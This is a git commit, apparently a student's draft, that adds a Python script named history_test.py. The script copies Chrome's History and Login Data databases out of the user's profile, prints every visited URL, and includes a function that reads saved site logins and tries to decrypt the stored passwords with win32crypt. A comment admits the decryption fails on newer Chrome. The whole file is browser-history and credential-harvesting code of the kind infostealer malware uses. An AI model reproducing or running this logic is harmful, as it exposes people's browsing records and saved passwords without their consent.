7a9a10e26d81b9aa923a6f87d6db8ebae044183c
nicholaslum97 <2001605@sit.singaporetech.edu.sg>
2021-10-27 22:13:00 +0800

    Create history_test.py

---
+++ chrome_ext_draft/history_test.py
@@ -0,0 +1,39 @@
+from os import getenv
+import sqlite3
+import shutil
+import win32crypt
+
+def copy_history_file():
+    original = f'{getenv("LOCALAPPDATA")}/Google/Chrome/User Data/Default/History'
+    target = fr'{getenv("USERPROFILE")}/History'
+
+    shutil.copyfile(original, target)
+
+def copy_pw_file ():
+    original = f'{getenv("LOCALAPPDATA")}/Google/Chrome/User Data/Default/Login Data'
+    target = f'{getenv("USERPROFILE")}/Login Data'
+
+    shutil.copyfile(original, target)
+
+def print_history():
+    conn = sqlite3.connect(f'{getenv("USERPROFILE")}/History')
+    cur = conn.cursor()
+    cur.execute("SELECT url FROM urls")
+    print(cur.fetchall())
+    conn.close()
+
+def print_password():
+    conn = sqlite3.connect(f'{getenv("USERPROFILE")}/Login Data')
+    cur = conn.cursor()
+    cur.execute("SELECT action_url, username_value, password_value FROM logins")
+    for result in cur.fetchall():
+        url = result[0]
+        username = result[1]
+        # dosen't work, chrome changed how they encrypt their file :C
+        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+        print(url, username, password)
+    conn.close()
+
+if __name__ == '__main__':
+    copy_history_file()
+    print_history()
